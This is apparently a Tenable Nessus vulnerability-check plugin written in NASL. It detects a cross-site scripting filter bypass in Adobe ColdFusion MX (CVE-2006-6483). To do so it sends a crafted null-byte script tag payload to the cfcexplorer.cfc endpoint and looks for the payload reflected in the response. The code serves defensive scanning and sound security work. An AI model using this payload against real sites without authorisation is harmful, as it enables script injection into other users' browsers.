#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(24279);
  script_version("$Revision: 1.22 $");
  script_cvs_date("$Date: 2016/10/07 13:30:47 $");

  script_cve_id("CVE-2006-6483");
  script_bugtraq_id(21532);
  script_osvdb_id(31054);

  script_name(english:"ColdFusion MX Null Byte Tag XSS Protection Bypass");
  script_summary(english:"Checks for an XSS flaw in ColdFusion.");

 script_set_attribute(attribute:"synopsis", value:
"A web-based application running on the remote web server is affected
by a cross-site scripting vulnerability.");
 script_set_attribute(attribute:"description", value:
"The version of Adobe ColdFusion running on the remote host is affected
by a cross-site scripting vulnerability due to a failure to completely
sanitize user-supplied input before using it to generate dynamic
content. A remote, unauthenticated attacker can leverage this issue to
inject arbitrary HTML or script code into a user's browser to be
executed within the security context of the affected site.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2006/Dec/210");
  script_set_attribute(attribute:"see_also", value:"http://www.adobe.com/support/security/bulletins/apsb07-06.html");
  script_set_attribute(attribute:"solution", value:
"Update to ColdFusion MX 7.0.2 if necessary and apply the hotfix
referenced in the vendor advisory above.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/12/10");
  script_set_attribute(attribute:"patch_publication_date", value:"2007/03/13");
  script_set_attribute(attribute:"plugin_publication_date", value:"2007/02/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:adobe:coldfusion");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("coldfusion_detect.nasl");
  script_require_ports("Services/www", 80, 8500);
  script_require_keys("installed_sw/ColdFusion");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("install_func.inc");

app = 'ColdFusion';
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# Send a request to exploit the flaw.
xss = "<0script>alert('" +SCRIPT_NAME-".nasl"+"-"+unixtime()+"')</script>";
exss = urlencode(
  str:xss,
  unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!~*'()-]/=;<>"
);

url =
  '/CFIDE/componentutils/cfcexplorer.cfc?' +
  'method=getcfcinhtmtestl&' +
  'name=CFIDE.adminapi.administrator&' +
  'path=/cfide/adminapi/administrator.cfctest">'+ exss;

res = http_send_recv3(method:"GET", item:dir+url, port:port, exit_on_fail:TRUE);

# There's a problem if our exploit appears in 'faultactor' as-is.
if ('PATH=/cfide/adminapi/administrator.cfctest">'+xss >< res[2] &&
    'form name="loginform" action=' >< res[2] &&
    'method="POST' >< res[2])
{
  output = strstr(res[2], 'PATH=/cfide/adminapi/administrator.cfctest">');
  if (empty_or_null(output)) output = res[2];

  security_report_v4(
     port       : port,
     severity   : SECURITY_WARNING,
     generic    : TRUE,
     xss        : TRUE,  # XSS KB key
     request    : make_list(install_url + url),
     output     : chomp(output),
     rep_extra  : '\nNote that this attack is known to work against users of Internet\nExplorer.  Other browsers might not be affected.\n'
    );
  exit(0);
}
else
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
